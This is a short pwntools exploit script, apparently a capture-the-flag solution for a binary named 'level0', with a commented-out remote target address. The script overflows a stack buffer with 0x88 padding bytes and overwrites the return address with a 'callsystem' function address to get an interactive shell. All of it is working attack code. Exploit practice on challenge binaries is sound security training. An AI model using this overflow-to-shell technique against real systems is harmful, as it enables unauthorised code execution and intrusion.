from pwn import *
p = process('./level0')
# p = remote("111.200.241.244", "57359")

p.recvuntil("Hello, World\n")

call_system = 0x400597
payload = "A" * (0x80 + 0x8)  + p64(call_system)
p.sendline(payload)

p.interactive()

'''
elf = ELF('./level0')
p = elf.process()
sysaddr = elf.symbols['callsystem']
'''
